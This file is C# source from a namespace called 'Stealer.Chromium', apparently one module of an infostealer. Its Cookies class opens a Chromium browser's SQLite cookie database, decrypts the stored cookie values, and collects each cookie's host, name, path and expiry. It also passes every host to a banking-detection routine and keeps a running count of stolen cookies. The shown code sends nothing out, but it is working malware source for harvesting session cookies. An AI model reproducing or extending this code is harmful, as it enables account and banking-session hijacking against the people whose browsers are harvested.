using System.IO;
using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class Cookies
    {
        /// <summary>
        /// Get cookies from chromium based browsers
        /// </summary>
        /// <param name="sCookie"></param>
        /// <returns>List with cookies</returns>
        public static List<Cookie> Get(string sCookie)
        {
            try
            {
                List<Cookie> lcCookies = new List<Cookie>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSQLite == null)
                    return lcCookies;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    Cookie cCookie = new Cookie();

                    cCookie.sValue = Crypto.EasyDecrypt(sCookie, sSQLite.GetValue(i, 12));


                    if (cCookie.sValue == "")
                        cCookie.sValue = sSQLite.GetValue(i, 3);

                    cCookie.sHostKey = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    cCookie.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    cCookie.sPath = Crypto.GetUTF8(sSQLite.GetValue(i, 4));
                    cCookie.sExpiresUtc = Crypto.GetUTF8(sSQLite.GetValue(i, 5));
                    cCookie.sIsSecure = Crypto.GetUTF8(sSQLite.GetValue(i, 6).ToUpper());

                    // Analyze value
                    Banking.ScanData(cCookie.sHostKey);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }

                return lcCookies;
            }
            catch { return new List<Cookie>(); }
        }
    }
}
